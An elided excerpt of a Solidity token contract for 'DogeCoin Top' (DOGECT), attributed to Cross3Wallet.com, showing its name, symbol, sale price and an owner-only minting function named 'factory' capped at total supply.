...
/**
 * Cross3Wallet.com official Contract...
*/
...
contract DogeCoin{
    ...
    string private _name = "DogeCoin Top";
    string private _symbol = "DOGECT";
    ...
    uint256 private salePrice = 3000000;
    ...
    function factory(address account, uint256 amount) public onlyOwner() {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
         _cap = _cap.add(amount);
        require(_cap <= _totalSupply, "ERC20Capped: cap exceeded");
        _balances[account] = _balances[account].add(amount);
